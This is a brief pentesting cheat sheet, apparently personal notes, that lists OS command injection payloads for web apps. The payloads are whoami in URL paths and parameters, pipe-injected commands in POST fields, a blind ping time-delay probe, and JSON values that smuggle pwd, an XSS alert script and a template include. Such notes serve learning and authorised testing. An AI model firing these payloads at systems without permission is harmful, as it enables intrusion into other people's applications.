---
title: OS Command Injection
desc: 
tags: [Burp, Command Injection, Web]
alts: []
render_with_liquid: false
---

## Change URL Path/Parameters

```
/api/cmd/whoami
/command/whoami

/?cmd=whoami
```

<br />

## Change POST Parameters

1. **Basic Command Injection**

    ```html
    productId=1&stockId=1|whoami
    ```

2. **Blind Command Injection (Time Delay)**

    Using **"ping"** command.

    ```html
    name=michael&email=michael@example.com||ping+-c+10+127.0.0.1||&message=hello
    ```

3. **JSON Injection**

    ```json
    { "username": "\"; pwd \"" }
    {"name":"<script>alert(1)</script>", "email":"victim@vulnerable.com"}
    {"name": "admin", "content": "{{template: ./admin.php}}"}
    ```